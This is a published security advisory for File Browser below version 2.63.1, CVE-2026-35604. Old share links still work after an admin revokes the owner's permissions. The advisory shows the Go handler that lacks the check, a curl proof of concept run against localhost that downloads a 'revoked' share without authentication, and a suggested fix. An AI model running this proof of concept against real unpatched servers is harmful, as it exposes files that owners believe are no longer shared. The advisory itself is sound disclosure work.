# [H] File Browser share links remain accessible after Share/Download permissions are revoked

## Summary
Severity: High
Advisory: GHSA-v9w4-gm2x-6rvf
CVE: CVE-2026-35604
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-v9w4-gm2x-6rvf
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.63.1

## Details
When an admin revokes a user's Share and Download permissions, existing share links created by that user remain fully accessible to unauthenticated users. The public share download handler does not re-check the share owner's current permissions. Verified with a running PoC against v2.62.2 (commit 860c19d).

## Details

Share creation (`http/share.go:21-29`) correctly checks permissions:

    func withPermShare(fn handleFunc) handleFunc {
        return withUser(func(w http.ResponseWriter, r *http.Request, d *data) (int, error) {
            if !d.user.Perm.Share || !d.user.Perm.Download {
                return http.StatusForbidden, nil
            }
            return fn(w, r, d)
        })
    }

But share access (`http/public.go:18-87`, `withHashFile`) does not:

    var withHashFile = func(fn handleFunc) handleFunc {
        return func(w http.ResponseWriter, r *http.Request, d *data) (int, error) {
            link, err := d.store.Share.GetByHash(id)   // line 21: checks share exists
            authenticateShareRequest(r, link)            // line 26: checks password
            user, err := d.store.Users.Get(...)          // line 31: checks user exists
            d.user = user                                // line 36: sets user
            file, err := files.NewFileInfo(...)           // line 38: gets file
            // MISSING: no check for d.user.Perm.Share or d.user.Perm.Download
        }
    }

## Proof of Concept (runtime-verified)

    # Step 1: Login as admin
    TOKEN=$(curl -s -X POST http://localhost:18080/api/login \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"<admin-password>"}')

    # Step 2: Create testuser with Share+Download permissions
    curl -X POST http://localhost:18080/api/users \
      -H "X-Auth: $TOKEN" -H "Content-Type: application/json" \
      -d '{"what":"user","which":[],"current_password":"<admin-password>",
           "data":{"username":"testuser","password":"TestPass123!","scope":".",
           "perm":{"share":true,"download":true,"create":true}}}'

    # Step 3: Login as testuser and create share
    USER_TOKEN=$(curl -s -X POST http://localhost:18080/api/login \
      -H "Content-Type: application/json" \
      -d '{"username":"testuser","password":"TestPass123!"}')
    curl -X POST http://localhost:18080/api/share/secret.txt \
      -H "X-Auth: $USER_TOKEN" -H "Content-Type: application/json" -d '{}'
    # Returns: {"hash":"fB4Qwtsn","path":"/secret.txt","userID":2,"expire":0}

    # Step 4: Verify share works (unauthenticated)
    curl http://localhost:18080/api/public/dl/fB4Qwtsn
    # Returns: file content (200 OK)

    # Step 5: Admin revokes testuser's Share and Download permissions
    curl -X PUT http://localhost:18080/api/users/2 \
      -H "X-Auth: $TOKEN" -H "Content-Type: application/json" \
      -d '{"what":"user","which":["all"],"current_password":"<admin-password>",
           "data":{"id":2,"username":"testuser","scope":".",
           "perm":{"share":false,"download":false,"create":true}}}'

    # Step 6: Verify testuser CANNOT create new shares
    curl -X POST http://localhost:18080/api/share/secret.txt \
      -H "X-Auth: $USER_TOKEN" -d '{}'
    # Returns: 403 Forbidden (correct)

    # Step 7: THE BUG - old share STILL works
    curl http://localhost:18080/api/public/dl/fB4Qwtsn
    # Returns: file content (200 OK) - SHOULD be 403

## Impact

When an admin revokes a user's Share or Download permissions:
- New share creation is correctly blocked (403)
- But all existing shares created by that user remain fully accessible to unauthenticated users
- The admin has a false sense of security: they believe revoking Share permission stops all sharing

This is the same vulnerability class as GHSA-68j5-4m99-w9w9 ("Authorization Policy Bypass in Public Share Download Flow").

## Suggested Fix

Add permission re-validation in `withHashFile`:

    user, err := d.store.Users.Get(d.server.Root, link.UserID)
    if err != nil {
        return errToStatus(err), err
    }

    // Verify the share owner still has Share and Download permissions
    if !user.Perm.Share || !user.Perm.Download {
        return http.StatusForbidden, nil
    }

    d.user = user

---

**Update:** Fix submitted as PR #5888.

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-v9w4-gm2x-6rvf
- https://nvd.nist.gov/vuln/detail/CVE-2026-35604
- https://github.com/filebrowser/filebrowser/pull/5888
- https://github.com/filebrowser/filebrowser
